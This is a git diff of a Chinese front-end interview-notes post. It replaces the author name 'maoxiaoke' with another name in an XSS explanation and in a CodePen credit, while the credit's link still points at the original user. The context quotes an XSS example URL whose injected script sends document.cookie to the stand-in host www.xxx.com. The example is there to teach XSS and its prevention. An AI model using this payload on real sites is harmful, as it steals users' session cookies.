@@ -394,7 +394,7 @@ XSS的原理
 
 Web应用未对用户提交请求的数据做充分的检查过滤，允许用户在提交的数据中掺入HTML代码(最主要的是“>”、“<”)，并将未经转义的恶意代码输出到第三方用户的浏览器解释执行，是导致XSS漏洞的产生原因。
 
-> 比如: 访问有个网站http://127.0.0.1/?name=maoxiaoke会输出用户名字。如果恶意用户传递这样的url：http://127.0.0.1/?name=&#60;script&#62;document.location.href='http://www.xxx.com/cookie?'+document.cookie&#60;/script&#62;，这样就可以把当前的cookie发送到指定的站点：www.xxx.com。
+> 比如: 访问有个网站http://127.0.0.1/?name=qiaoshengchuan会输出用户名字。如果恶意用户传递这样的url：http://127.0.0.1/?name=&#60;script&#62;document.location.href='http://www.xxx.com/cookie?'+document.cookie&#60;/script&#62;，这样就可以把当前的cookie发送到指定的站点：www.xxx.com。
 
 如何预防XSS
 
@@ -691,7 +691,7 @@ console.log(unique(arr));
 
 题目要求: 使用flex布局实现三等分，左右两个元素分别贴到左边和右边，垂直居中
 
-<p data-height="265" data-theme-id="light" data-slug-hash="bRZzwo" data-default-tab="css,result" data-user="maoxiake" data-embed-version="2" data-pen-title="a flex layout" class="codepen">See the Pen <a href="https://codepen.io/maoxiake/pen/bRZzwo/">a flex layout</a> by maoxiaoke (<a href="https://codepen.io/maoxiake">@maoxiake</a>) on <a href="https://codepen.io">CodePen</a>.</p>
+<p data-height="265" data-theme-id="light" data-slug-hash="bRZzwo" data-default-tab="css,result" data-user="maoxiake" data-embed-version="2" data-pen-title="a flex layout" class="codepen">See the Pen <a href="https://codepen.io/maoxiake/pen/bRZzwo/">a flex layout</a> by qiaoshengchuan (<a href="https://codepen.io/maoxiake">@maoxiake</a>) on <a href="https://codepen.io">CodePen</a>.</p>
 <script async src="https://production-assets.codepen.io/assets/embed/ei.js"></script>
 
 可参考: [Flexbox的完全教程]({{ '/2017/07/15/Flex' | prepend: site.baseurl }})
